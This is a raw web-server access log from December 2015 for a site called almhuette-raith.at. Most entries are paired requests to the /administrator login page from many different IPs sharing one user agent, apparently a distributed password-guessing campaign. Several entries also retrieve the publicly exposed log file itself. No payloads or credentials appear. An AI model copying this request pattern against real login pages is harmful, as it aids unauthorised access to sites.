83.69.0.29 - - [13/Dec/2015:12:13:05 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.167.78.166 - - [13/Dec/2015:12:16:02 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.167.78.166 - - [13/Dec/2015:12:16:03 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.49.68.156 - - [13/Dec/2015:12:18:04 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.49.68.156 - - [13/Dec/2015:12:18:04 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.72.185.236 - - [13/Dec/2015:12:19:19 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.72.185.236 - - [13/Dec/2015:12:19:19 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
78.81.240.26 - - [13/Dec/2015:12:19:37 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
78.81.240.26 - - [13/Dec/2015:12:19:38 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
157.55.39.7 - - [13/Dec/2015:12:21:07 +0100] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.8 - - [13/Dec/2015:12:21:13 +0100] "GET / HTTP/1.1" 200 10479 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
81.20.102.154 - - [13/Dec/2015:12:21:58 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
81.20.102.154 - - [13/Dec/2015:12:21:58 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.76.246.140 - - [13/Dec/2015:12:26:43 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.76.246.140 - - [13/Dec/2015:12:26:43 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.44.113.180 - - [13/Dec/2015:12:27:48 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.44.113.180 - - [13/Dec/2015:12:27:48 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.165.15.204 - - [13/Dec/2015:12:28:58 +0100] "GET /index.php?option=com_phocagallery&view=category&id=1&Itemid=53&limitstart=20 HTTP/1.1" 200 15436 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "-"
128.73.20.111 - - [13/Dec/2015:12:30:55 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.73.20.111 - - [13/Dec/2015:12:30:55 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.203.170.128 - - [13/Dec/2015:12:31:34 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.203.170.128 - - [13/Dec/2015:12:31:34 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
23.95.241.115 - - [13/Dec/2015:12:32:27 +0100] "GET /apache-log/access.log HTTP/1.0" 200 172495 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
66.249.66.19 - - [13/Dec/2015:12:33:58 +0100] "GET / HTTP/1.1" 200 10479 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
185.3.32.17 - - [13/Dec/2015:12:35:09 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
185.3.32.17 - - [13/Dec/2015:12:35:09 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
80.66.158.11 - - [13/Dec/2015:12:38:59 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
80.66.158.11 - - [13/Dec/2015:12:39:00 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.76.246.140 - - [13/Dec/2015:12:42:45 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
93.76.246.140 - - [13/Dec/2015:12:42:45 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
82.193.155.224 - - [13/Dec/2015:12:43:29 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
82.193.155.224 - - [13/Dec/2015:12:43:29 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.169.248.247 - - [13/Dec/2015:12:43:46 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.169.248.247 - - [13/Dec/2015:12:43:46 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.71.187.170 - - [13/Dec/2015:12:44:35 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.71.187.170 - - [13/Dec/2015:12:44:35 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.24.125.23 - - [13/Dec/2015:12:46:06 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.24.125.23 - - [13/Dec/2015:12:46:06 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.129.207.169 - - [13/Dec/2015:12:47:01 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
178.129.207.169 - - [13/Dec/2015:12:47:01 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
185.3.32.17 - - [13/Dec/2015:12:47:21 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
185.3.32.17 - - [13/Dec/2015:12:47:21 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.140.31.161 - - [13/Dec/2015:12:48:00 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.140.31.161 - - [13/Dec/2015:12:48:00 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [13/Dec/2015:12:52:45 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [13/Dec/2015:12:52:46 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.120.59.191 - - [13/Dec/2015:12:54:00 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
188.120.59.191 - - [13/Dec/2015:12:54:00 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.141.91.118 - - [13/Dec/2015:12:55:00 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.141.91.118 - - [13/Dec/2015:12:55:01 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.146.101.241 - - [13/Dec/2015:12:55:05 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.146.101.241 - - [13/Dec/2015:12:55:06 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
37.1.206.196 - - [13/Dec/2015:12:55:58 +0100] "GET /administrator/index.php HTTP/1.1" 200 4263 "http://almhuette-raith.at/administrator/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36" "-"
37.1.206.196 - - [13/Dec/2015:12:56:00 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36" "-"
37.1.206.196 - - [13/Dec/2015:12:56:00 +0100] "GET /administrator/index.php HTTP/1.1" 200 4263 "http://almhuette-raith.at/administrator/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36" "-"
87.117.14.0 - - [13/Dec/2015:12:59:58 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
87.117.14.0 - - [13/Dec/2015:12:59:59 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.227.29.79 - - [13/Dec/2015:13:00:40 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.227.29.79 - - [13/Dec/2015:13:00:40 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
206.59.253.65 - - [13/Dec/2015:13:01:25 +0100] "GET /apache-log/access.log HTTP/1.1" 200 179700 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
109.184.11.34 - - [13/Dec/2015:13:07:08 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
109.184.11.34 - - [13/Dec/2015:13:07:09 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.166.75.133 - - [13/Dec/2015:13:11:14 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.166.75.133 - - [13/Dec/2015:13:11:14 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.29.224.215 - - [13/Dec/2015:13:13:17 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.29.224.215 - - [13/Dec/2015:13:13:17 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.53.106.125 - - [13/Dec/2015:13:16:17 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.53.106.125 - - [13/Dec/2015:13:16:17 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
89.232.118.5 - - [13/Dec/2015:13:18:31 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
89.232.118.5 - - [13/Dec/2015:13:18:31 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
90.154.66.233 - - [13/Dec/2015:13:19:08 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
90.154.66.233 - - [13/Dec/2015:13:19:08 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.210.113.241 - - [13/Dec/2015:13:19:42 +0100] "GET /apache-log/access.log HTTP/1.1" 200 182212 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.4.600 Chrome/30.0.1599.101 Safari/537.36" "-"
128.72.82.254 - - [13/Dec/2015:13:20:28 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
128.72.82.254 - - [13/Dec/2015:13:20:28 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
37.113.244.223 - - [13/Dec/2015:13:26:59 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
37.113.244.223 - - [13/Dec/2015:13:26:59 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.141.121.10 - - [13/Dec/2015:13:27:33 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.141.121.10 - - [13/Dec/2015:13:27:33 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.140.24.131 - - [13/Dec/2015:13:30:35 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.140.24.131 - - [13/Dec/2015:13:30:35 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.214.240.8 - - [13/Dec/2015:13:31:44 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.214.240.8 - - [13/Dec/2015:13:31:44 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.139.27.245 - - [13/Dec/2015:13:32:24 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
95.139.27.245 - - [13/Dec/2015:13:32:25 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.138.36.198 - - [13/Dec/2015:13:33:03 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.138.36.198 - - [13/Dec/2015:13:33:04 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.24.132.190 - - [13/Dec/2015:13:33:10 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
213.24.132.190 - - [13/Dec/2015:13:33:10 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.211.128.248 - - [13/Dec/2015:13:36:00 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.211.128.248 - - [13/Dec/2015:13:36:00 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.211.46.18 - - [13/Dec/2015:13:37:55 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
46.211.46.18 - - [13/Dec/2015:13:37:55 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
204.44.90.14 - - [13/Dec/2015:13:39:16 +0100] "GET /apache-log/access.log HTTP/1.0" 200 186228 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
204.44.90.14 - - [13/Dec/2015:13:39:18 +0100] "GET /robots.txt HTTP/1.1" 200 304 "http://www.almhuette-raith.at/apache-log/access.log" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
94.19.17.65 - - [13/Dec/2015:13:41:09 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
94.19.17.65 - - [13/Dec/2015:13:41:09 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.32.68.29 - - [13/Dec/2015:13:42:17 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.32.68.29 - - [13/Dec/2015:13:42:18 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
85.173.94.97 - - [13/Dec/2015:13:44:47 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
85.173.94.97 - - [13/Dec/2015:13:44:47 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.201.52.125 - - [13/Dec/2015:13:49:29 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
177.201.52.125 - - [13/Dec/2015:13:49:30 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.166.200.19 - - [13/Dec/2015:13:50:12 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.166.200.19 - - [13/Dec/2015:13:50:12 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.122.96.106 - - [13/Dec/2015:14:00:31 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.122.96.106 - - [13/Dec/2015:14:00:31 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.218.92.2 - - [13/Dec/2015:14:01:05 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.218.92.2 - - [13/Dec/2015:14:01:05 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.219.156.45 - - [13/Dec/2015:14:06:38 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
91.219.156.45 - - [13/Dec/2015:14:06:38 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.194.74.20 - - [13/Dec/2015:14:08:22 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
176.194.74.20 - - [13/Dec/2015:14:08:22 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
130.255.13.57 - - [13/Dec/2015:14:09:28 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
130.255.13.57 - - [13/Dec/2015:14:09:28 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
87.117.38.218 - - [13/Dec/2015:14:11:35 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
87.117.38.218 - - [13/Dec/2015:14:11:36 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.166.200.19 - - [13/Dec/2015:14:13:53 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
5.166.200.19 - - [13/Dec/2015:14:13:53 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [13/Dec/2015:14:14:55 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
83.167.113.100 - - [13/Dec/2015:14:14:55 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
77.244.21.14 - - [13/Dec/2015:14:17:50 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
77.244.21.14 - - [13/Dec/2015:14:17:51 +0100] "POST /administrator/index.php HTTP/1.1" 200 4494 "http://almhuette-raith.at/administrator/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
2.86.149.141 - - [13/Dec/2015:14:19:18 +0100] "GET /apache-log/access.log HTTP/1.1" 200 191995 "http://www.almhuette-raith.at/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36" "-"
109.184.11.34 - - [13/Dec/2015:14:23:17 +0100] "GET /administrator/ HTTP/1.1" 200 4263 "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
